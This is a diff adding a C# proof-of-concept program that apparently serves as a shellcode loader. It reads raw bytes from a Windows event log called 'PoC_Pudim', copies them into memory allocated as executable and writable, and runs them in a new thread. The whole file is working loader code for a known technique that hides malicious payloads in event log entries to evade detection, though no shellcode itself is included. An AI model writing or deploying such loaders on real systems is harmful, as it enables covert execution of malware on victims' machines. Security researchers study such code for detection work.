@@ -1,0 +1,47 @@
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        // Read the raw data from the event log
+        EventLog fgpeventLog = new EventLog();
+
+        fgpeventLog.Log = "PoC_Pudim";
+
+        //
+        EventLogEntryCollection eventdataraw = fgpeventLog.Entries;
+
+        //byte[] rawData = eventLog.Entries[0].Data;
+        byte[] rawData = eventdataraw[0].Data;
+        //Console.WriteLine(rawData.ToString());
+
+        // Allocate memory to hold the shellcode
+        IntPtr allocMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawData.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        // Copy the shellcode to the allocated memory
+        Marshal.Copy(rawData, 0, allocMem, rawData.Length);
+
+        // Create a thread to execute the shellcode
+        IntPtr hThread = IntPtr.Zero;
+        UIntPtr threadId = UIntPtr.Zero;
+        IntPtr pinfo = IntPtr.Zero;
+
+        hThread = CreateThread(IntPtr.Zero, 0, allocMem, pinfo, 0, ref threadId);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+
+    private static UInt32 MEM_COMMIT = 0x1000;
+    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UIntPtr lpThreadId);
+
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    [DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, UInt32 flAllocationType, UInt32 flProtect);
+}
